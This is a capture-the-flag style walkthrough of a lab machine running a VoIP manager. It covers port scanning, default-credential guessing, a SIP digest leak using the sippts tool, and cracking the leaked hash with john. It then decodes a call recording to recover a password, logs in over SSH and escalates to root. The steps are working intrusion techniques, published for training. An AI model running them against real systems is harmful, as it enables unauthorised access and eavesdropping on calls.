@@ -1,0 +1,188 @@
+																							               VoIP Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.156
+export IP=192.168.68.156
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt
+
+nmap -Pn -n -sC -sV -p22,80,8000 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-title: VOIP Manager
+|_Requested resource was login.php
+8000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-open-proxy: Proxy might be redirecting requests
+|_Requested resource was login.php
+Service Info: OS: Linux;
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+ Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+/login.php
+
+nikto --url $IP
+Root page / redirects to: login.php
+
+Port 80 - Enumeration
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/big.txt  -o gobuster.txt -t 50 -x zip,php,txt 
+/cdr.php              (Status: 302) [Size: 0] [--> login.php]
+/files                (Status: 301) [Size: 316] [--> http://192.168.68.156/files/]
+/index.php            (Status: 302) [Size: 1] [--> login.php]
+/login                (Status: 301) [Size: 316] [--> http://192.168.68.156/login/]
+/login.php            (Status: 200) [Size: 4342]
+/logout.php           (Status: 200) [Size: 11]
+/routing.php          (Status: 302) [Size: 0] [--> login.php]
+/server-status        (Status: 403) [Size: 279]
+/streams.php          (Status: 302) [Size: 0] [--> login.php]
+
+# Let's try some default credentails for VoIP. No luck.
+https://github.com/netbiosX/Default-Credentials/blob/master/VoIP-Default-Password-List.mdown
+Usernames:
+admin
+kermit
+Admin
+Administrator
+cisco
+administrator
+system
+installer
+system
+Polycom
+
+Passwords:
+packet
+kermit
+admin
+Administrator
+admin
+admin
+admin
+cisco
+**#
+admin
+password
+1000
+password
+22222
+admin
+456
+456
+Sonus12345
+admin
+
+
+# Nothing really usefull, let's switch to port 8000
+http://192.168.68.156:8000/login.php           # Another login page.
+
+# Let's try some default credentials, including the ones we've tried for port 80.
+
+admin / admin              # working credentials
+
+# Information gathered
+VOIP Version:v2.0
+
+users:
+William:ID-2983
+Emma:ID-3029
+Voiper:ID-1462
+John:ID-2174
+Olivia:ID-9811
+Ava:ID-2111
+Rocky:Disabled
+NoahDisabled
+
+
+Exploitation
+
+SIP digest leak is a SIP phone vulnerability that allows the attacker to get a digest response from a phone and use it to guess the password via a brute-force attack. The VoIP responder on the target has a predefined wildcard <recv response="*">, allowing us to send 407 Proxy Auth Required instead of ACK, triggering the digest leak response.
+
+A public exploit is available at https://github.com/Pepelux/sippts
+
+git clone https://github.com/Pepelux/sippts.git
+cd sippts 
+pip3 install -r requirements.txt
+python3 sipdigestleak.py -i 192.168.68.156
+
+# This exploit will abuse port 5060 UDP
+
+[✓] Target: 192.168.68.156:5060/UDP                                                                                                                                                                         
+                                                                                                                                                                                                            
+[=>] Request INVITE                                                                                                                                                                                         
+[<=] Response 180 Ringing                                                                                                                                                                                   
+[<=] Response 200 OK                                                                                                                                                                                        
+[=>] Request ACK                                                                                                                                                                                            
+        ... waiting for BYE ...                                                                                                                                                                             
+[<=] Received BYE                                                                                                                                                                                           
+[=>] Request 407 Proxy Authentication Required                                                                                                                                                              
+[<=] Received BYE                                                                                                                                                                                           
+[=>] Request 200 Ok                                                                                                                                                                                         
+Auth=Digest username="adm_sip", uri="sip:127.0.0.1:5060", password="074b62fb6c21b84e6b5846e6bb001f67", algorithm=MD5   
+
+# Let's crack the hash. We've discovered the password passion.
+
+john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   
+
+Credentials discovered: adm_sip / passion     
+
+# Now that we have the password let's see if we can get access to SSH or to the web portal at port 80. Remember that we have some username discovered from port 8000.
+# Using the recovered credentials adm_sip:passion to log in on port 80, we'll navigate to the CDR tab at he top, where we find call data records for users. 
+# Here we find a raw call recording RTP (Real-time Transport Protocol) file. Since it's in the raw call format, we need the correct encoder to decode this file.
+# Since we don't know which encoding was used, we can discover this by navigating to the Stream Rates tab on the left, we obtain important information on encoding techniques, frequency (Hz), and bit rates that are used to record and encode calls.
+
+
+
+
+
+Input #0, wav, from 'Call-id':
+Duration: 00:00:00:00, bitrate: 128 kb/s
+
+Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 8000 Hz, mono, s16, 128 kb/s
+
+Stream mapping:
+Stream #0:0 -> #0:0 (pcm_s16le (native) -> pcm_mulaw (native))
+
+Output #0, rtp, to 'raw': PT=ITU-T G.711 PCMU
+
+
+Metadata:
+encoder : Lavf58.29.100
+Stream #0:0: Audio: pcm_mulaw, 8000 Hz, mono, s16, 64 kb/s
+
+Metadata:
+encoder : Lavc58.54.100 pcm_mulaw
+size= --kB time=00:00:00:00 bitrate=64.8kbits/s speed= 1x
+
+# This information tells us that the raw file is encoded using the G.711 encoder pcm_mulaw with the rate of 8000Hz. We can use the tool sox to decode the raw file with the following syntax.
+sudo apt-get -y install sox
+
+sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav
+
+play out.wav           
+
+# The Audio stated that “Your Password has been changed to Password1234 where P is capital”
+# Now that we have this information, let's try to get access to SSH AGAIN using the names discovered on port 8000 combined with the Password1234. Fingers crossed!
+
+Discovered valid SSH credentials    voiper : Password1234
+
+ssh voiper@$IP
+Password1234
+
+cd /home/voiper
+cat local.txt                               # Flag: dd11f76d2315c00e9abc5e79dbf2c4b4
+
+Privilege escalation
+
+sudo -l
+Password1234
+
+cd /root
+cat proof.txt                              # Flag: cb25883e0f2278f090185f796b5d0559
